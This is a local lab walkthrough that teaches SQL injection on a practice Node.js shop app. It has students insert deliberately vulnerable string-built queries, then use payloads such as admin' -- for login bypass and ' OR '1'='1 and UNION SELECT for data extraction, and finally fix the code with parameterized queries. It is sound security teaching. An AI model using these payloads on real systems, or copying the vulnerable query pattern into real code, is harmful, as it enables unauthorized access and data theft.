What is SQL injection?
In computing, **SQL injection** is a [code injection](https://en.wikipedia.org/wiki/Code_injection "Code injection") technique used to [attack](https://en.wikipedia.org/wiki/Attack_(computing) "Attack (computing)") data-driven applications, in which malicious [SQL](https://en.wikipedia.org/wiki/SQL "SQL") statements are inserted into an entry field for execution (e.g. to dump the [database](https://en.wikipedia.org/wiki/Database "Database") contents to the attacker or login without entering the password).

---

**PHASE 1: Set Up the Lab & Write the Vulnerable Code**

First off, this lab runs locally on your machine using Node.js. No VM, no Apache, no SSH. Just your terminal and a text editor.

**Step 1:**

Open a terminal and navigate to the project folder

```
cd ~/securecorp-ctf
```

NOTE: hit tab halfway through a folder name and it autocompletes. use that every single time.

**Step 2:**

Start the development server

```
npm run dev
```

This uses something called **nodemon** — it watches your files and automatically restarts the server every time you save. So every change you make takes effect immediately. No manual restarts needed.

You should see:

```
Server running at http://localhost:3000
```

Open your browser and go to `http://localhost:3000`

**Step 3:**

Now open `server.js` in VSCode (it should already be open in your editor).

Use `Ctrl + G` (or `Cmd + G` on Mac) to jump to **line 176**.

You'll see a comment block that looks like this:

```javascript
// TODO (PHASE 1 — STUDENT TASK):
// Replace the safe query below with this vulnerable one:
//
//   const query = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`;
```

Right now, a few lines below that comment, the login uses a **safe** parameterized query:

```javascript
// SAFE (default) — replace with the vulnerable query above to start the lab
const query = 'SELECT * FROM users WHERE username = ? AND password = ?';
```

**Your task:** replace those two lines with the vulnerable query from the comment above.

It should look like this after your change:

```javascript
const query = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`;
```

Make sure you use backticks `` ` `` not regular quotes `'` for the outer string. That's how JavaScript template literals work — they let you drop variables in with `${}`.

Save the file. Nodemon will restart the server automatically.

---

What you just wrote is vulnerable to SQL injection. Can you think why?

The code takes whatever you type in the username box and pastes it directly into the SQL string.

So if I type `gurmat` in the username box, the query becomes:

```sql
SELECT * FROM users WHERE username = 'gurmat' AND password = 'hahaha'
```

Why is that a problem? think.

what if I put `gurm'at` as my username?

```sql
SELECT * FROM users WHERE username = 'gurm'at' AND password = '...'
```

See it? the single quote breaks out of the string early. now whatever comes after it is treated as part of the SQL command itself. not just data anymore.

that's the whole idea.

**Step 4:**

Now do the same for the search endpoint. Jump to **line 438** in `server.js`.

You'll see the same setup — a TODO comment with the vulnerable query, and a safe one below it. Replace the safe search queries with the vulnerable versions from the comment:

```javascript
let query = `SELECT id, name, price, description, category FROM products WHERE (name LIKE '%${q}%' OR description LIKE '%${q}%')`;
if (category) query += ` AND category = '${category}'`;
```

And delete or comment out the `const params = [...]` line and the `if (category)` block below it, since those were only needed for the safe version.

Save the file again.

---

## Phase 2: Exploiting It

### Step 1: Explore the Website

1. Open `http://localhost:3000`
2. Spend a couple minutes clicking around — browse the shop, check the search page with category filters, click some products.
3. The navbar has: **Shop**, **🔍 Search**, **🛒 Cart**, and **Login**
4. Once you've got a feel for the app, head to the **Login** page.

### Step 2: Test with Normal Credentials

Log in with a regular account first so you know what normal looks like:

- **Username:** `bob`
- **Password:** `bob123`

You'll see "👤 Bob" in the top navbar after login. Notice there's no **Admin** button — bob is just a regular user.

Log out and go back to the login page.

### Step 3: The Logic Test

What happens if you type the following into the **Username** field and use the correct password (`bob123`)?

- **Username:** `bob' AND 1=2--`

Do it and come back.

You get an **"Invalid Credentials"** error. Even though the username and password are technically correct. Why?

#### Behind the Scenes: What the Query Looks Like

By injecting `bob' AND 1=2--`, you forced the database to run this:

```sql
SELECT * FROM users WHERE username = 'bob' AND 1=2--' AND password = 'bob123'
```

#### Breaking It Down:

- **`--`** is a SQL comment. Everything after it gets ignored. Password check is gone.
- What's left: `WHERE username = 'bob' AND 1=2`
- `username = 'bob'` → **TRUE**
- `1=2` → **FALSE** (1 will never equal 2)
- `TRUE AND FALSE` → **FALSE**

Database returns zero rows, login fails. You injected SQL successfully — but your own logic made it fail on purpose.

Now what happens if you do `1=1` instead of `1=2` ?

try it with admin..

hacked..

---

### Step 4: Bypass the Admin Login (Properly)

1. Go to the **Login** page
2. Enter:
   - **Username:** `admin' --`
   - **Password:** `anything`
3. Click **Sign In**

The query becomes:

```sql
SELECT * FROM users WHERE username = 'admin' --' AND password = 'anything'
```

The `--` comments out the password check entirely. The database just finds admin and hands you the session.

After logging in:
- You'll see **👤 Admin** in the top navbar
- There's now an **⚙️ Admin** button — that's your privilege escalation

---

### Step 5: Search SQL Injection

Head to **🔍 Search** in the navbar and try a normal search first:

```
Keyboard
```

Mechanical Keyboard and Mechanical Keycap Set show up. Normal.

Now try this in the search box:

```
' OR '1'='1
```

All 30 products show up.

#### Why?

The search builds this query:

```sql
SELECT ... FROM products WHERE (name LIKE '%INPUT%' OR description LIKE '%INPUT%')
```

When you inject `' OR '1'='1`, it becomes:

```sql
SELECT ... WHERE (name LIKE '%' OR '1'='1'%' OR description LIKE '%' OR '1'='1'%')
```

`'1'='1'` is always true. So the whole WHERE condition is always true. Every row gets returned.

### Step 6: UNION Injection (Bonus)

Go to **🔍 Search** and try this:

```
' UNION SELECT id, username, email, email, 'user' FROM users --
```

This appends a second SELECT onto the products query. User account data — usernames, emails — shows up right there in the product list.

You need to match the number of columns (5 in this case: `id, name, price, description, category`). That's why there are 5 values in the UNION SELECT.

Can you extract passwords too?

---

### Step 7: Delete User Bob (The Objective)

Now that you're logged in as admin:

1. Click the **⚙️ Admin** button in the navbar
2. You'll see a user management table with all accounts
3. Find **bob** and click the **🗑️ Delete** button
4. Confirm the deletion

Reload the admin page. Bob is gone.

---

## Phase 3: Fixing the Vulnerabilities

Now that you've exploited both vulnerabilities, let's fix them.

### The Problem

Both endpoints use direct string concatenation — user input goes straight into SQL:

```javascript
// login — VULNERABLE
const query = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`;

// search — VULNERABLE
let query = `SELECT ... WHERE (name LIKE '%${q}%' OR description LIKE '%${q}%')`;
```

### The Fix: Parameterized Queries

Use **parameterized queries** — the `?` acts as a placeholder. The database receives user input as pure data, never as part of the SQL structure. Injection is impossible.

**Login fix (line ~189):**

```javascript
const query = 'SELECT * FROM users WHERE username = ? AND password = ?';
db.get(query, [username, password], (err, row) => { ... });
```

**Search fix (line ~451):**

```javascript
let query = 'SELECT id, name, price, description, category FROM products WHERE (name LIKE ? OR description LIKE ?)';
const params = [`%${q}%`, `%${q}%`];
if (category) { query += ' AND category = ?'; params.push(category); }
db.all(query, params, (err, products) => { ... });
```

### Key Difference

| Vulnerable | Safe |
|---|---|
| `` `...${username}...` `` | `?` placeholder |
| Input becomes SQL code | Input is treated as data |
| `admin' --` breaks the query | `admin' --` is stored as a literal string |
| Attacker controls query logic | Attacker controls nothing |

### Your Task

Replace the vulnerable queries you wrote in PHASE 1 with the safe parameterized versions above. Save the file — nodemon restarts automatically.

Try `admin' --` on the login again. It should just say "Invalid Credentials" instead of letting you in.

That means you fixed it.

---

## Verification Checklist

- [ ] Started the server with `npm run dev`
- [ ] Wrote the vulnerable login query at line 189
- [ ] Wrote the vulnerable search query at line 451
- [ ] Logged in as bob with normal credentials
- [ ] Used `bob' AND 1=2--` to understand false injection
- [ ] Used `admin' --` to bypass authentication and get admin access
- [ ] Found `' OR '1'='1` returns all products on the search page
- [ ] Deleted user bob from the admin panel
- [ ] Tried UNION injection on search (bonus)
- [ ] Fixed both vulnerabilities with parameterized queries
- [ ] Verified injection payloads no longer work after the fix

---

**Lab Complete.** 🏆
